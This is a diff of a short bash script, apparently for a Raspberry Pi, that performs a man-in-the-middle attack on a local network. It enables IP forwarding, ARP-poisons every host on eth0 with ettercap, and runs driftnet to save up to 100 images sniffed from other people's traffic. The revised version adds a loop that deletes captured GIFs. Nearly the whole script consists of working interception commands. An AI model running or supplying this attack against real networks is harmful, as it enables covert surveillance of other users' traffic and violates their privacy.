@@ -1,13 +1,17 @@
 #!/bin/bash
-echo "$(tput bold)$(tput setaf 1)start monitor mode$(tput sgr0)"
-sudo airmon-ng start wlan0
-wait
-echo "$(tput bold)$(tput setaf 1)MITM initialize$(tput sgr0)"
-sudo sh -c "echo 1 > /proc/sys/net/ipv4/ip_forward"  # setup port forwarding for arp poisoning 
+echo "$(tput bold)$(tput setaf 1)MITM initialize & enable port forwarding & make directory for files$(tput sgr0)"
+sudo mkdir localImages
+gif=$(find /home/pi/localImages/ -type f -name "*.gif")
+sudo sh -c "echo 1 > /proc/sys/net/ipv4/ip_forward"  # setup port forwarding for arp poisoning
 sudo ettercap -T -Q -M arp -i eth0 // // &
-sleep 10
-echo "$(tput bold)$(tput setaf 1)make directory, extract images & save$(tput sgr0)"
-sudo mkdir imageDirectory
-sudo driftnet -v -i eth0 -a -m 100 -d imageDirectory -x myImages && fg ##save 100 images in directory "imageDirectory"
-#sudo rm !(filename).gif  # remove all .gif files. nothing personal.
+echo "$(tput bold)$(tput setaf 1)extract images & save$(tput sgr0)"
+sudo driftnet -v -i eth0 -a -m 100 -d localImages & # save 100 images
+while :
+do
+if [[ ( -n $gif ) ]]
+then
+        echo "$(tput bold)$(tput setaf 1)delete all gifs$(tput sgr0)"
+        sudo rm /home/pi/localImages/*.gif
+fi
+done
 
